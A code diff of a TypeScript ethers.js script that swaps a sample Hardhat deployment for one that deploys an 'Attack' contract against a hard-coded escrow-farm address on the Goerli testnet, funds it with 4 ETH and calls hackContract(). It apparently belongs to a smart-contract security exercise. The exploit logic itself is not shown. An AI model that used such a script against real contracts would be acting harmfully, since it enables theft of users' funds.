@@ -1,22 +1,47 @@
-import { ethers } from "hardhat";
+import { ethers } from "ethers"; // Hardhat for testing
+import "dotenv/config";
+import * as FARMJSON from "../artifacts/contracts/DaoEscrowFarm.sol/DaoEscrowFarm.json";
+import * as ATTACKJSON from "../artifacts/contracts/Attack.sol/Attack.json";
+// eslint-disable-next-line node/no-missing-import
+import { Attack, DaoEscrowFarm } from "../typechain-types";
 
 async function main() {
-  const currentTimestampInSeconds = Math.round(Date.now() / 1000);
-  const ONE_YEAR_IN_SECS = 365 * 24 * 60 * 60;
-  const unlockTime = currentTimestampInSeconds + ONE_YEAR_IN_SECS;
+  const wallet = new ethers.Wallet(process.env.PRIVATE_KEY!);
+  console.log(`Using address ${wallet.address}`);
+  const provider = ethers.providers.getDefaultProvider("goerli");
+  const signer = wallet.connect(provider);
 
-  const lockedAmount = ethers.utils.parseEther("1");
+  // console.log("Deploying Escrow farm contract");
+  // const FarmFactory = new ethers.ContractFactory(
+  //   FARMJSON.abi,
+  //   FARMJSON.bytecode,
+  //   signer
+  // );
 
-  const Lock = await ethers.getContractFactory("Lock");
-  const lock = await Lock.deploy(unlockTime, { value: lockedAmount });
-
-  await lock.deployed();
-
-  console.log(`Lock with 1 ETH and unlock timestamp ${unlockTime} deployed to ${lock.address}`);
+  // const EFarmContract = (await FarmFactory.deploy()) as DaoEscrowFarm;
+  // await EFarmContract.deployed();
+  
+  // console.log(
+  //   "Completed Escrow Farm deployment at %s",
+  //  EFarmContract.address
+  // );
+  // Now deploy Attack
+  console.log("Deploying Attack Contract");
+  const AttackFactory = new ethers.ContractFactory(
+    ATTACKJSON.abi,
+    ATTACKJSON.bytecode,
+    signer
+  );
+  // address of deployed contract
+  const AttackContract = (await AttackFactory.deploy("0xd46DA3234eB913085898fB1610b93382A93E9800", {value: ethers.utils.parseEther("4")})) as Attack;
+  await AttackContract.deployed();
+  console.log("Completed Attack deployment at %s", AttackContract.address);
+  console.log("Attacking now");
+  AttackContract.connect(signer).hackContract();
+  
+  
 }
 
-// We recommend this pattern to be able to use async/await everywhere
-// and properly handle errors.
 main().catch((error) => {
   console.error(error);
   process.exitCode = 1;
